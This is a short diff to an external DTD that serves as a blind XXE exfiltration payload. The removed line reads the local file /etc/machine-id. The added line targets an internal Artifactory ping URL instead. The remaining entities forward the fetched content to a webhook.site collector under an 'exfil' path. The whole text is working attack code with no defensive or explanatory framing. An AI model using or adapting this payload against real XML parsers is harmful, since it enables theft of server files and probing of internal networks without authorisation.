@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/machine-id">
+<!ENTITY % file SYSTEM "https://artifactory.intcx.net/artifactory/api/system/ping">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/7a5592a0-eb45-4bf3-ad04-eb0bcd547b8e/exfil?xxe=%file;'>">
 %eval;
 %exfiltrate;
